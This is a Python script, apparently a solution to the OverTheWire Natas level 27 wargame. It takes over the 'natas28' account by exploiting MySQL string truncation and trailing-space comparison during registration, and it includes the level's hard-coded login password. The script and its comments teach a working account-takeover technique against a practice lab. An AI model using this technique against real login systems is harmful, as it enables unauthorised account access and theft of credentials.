import requests
import re

username = 'natas27'
password = 'mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth = (username, password))
# print response.text
response = session.post(url, data = \
				{"username" : "natas28" + " "*57+"X",
				 "password" : "anything"},
		auth = (username, password))


response = session.post(url, data = \
				{"username" : "natas28" + " "*57,
				 "password" : "anything"},
		auth = (username, password))
print (response.text)
# print (re.findall("[password] =&gt; (.*)\n",response.text)[0])

# MySQL truncates the X and sets username as natas28[57 spaces], when MySQL compares natas28 and natas28[57 spaces] it views then as equals
# so the query returns the real natas28 row and the query returns the first matching row, which is the original natas28 account since it was created first.
# The password doesn't cause a conflict because the select query doesnt check the password.
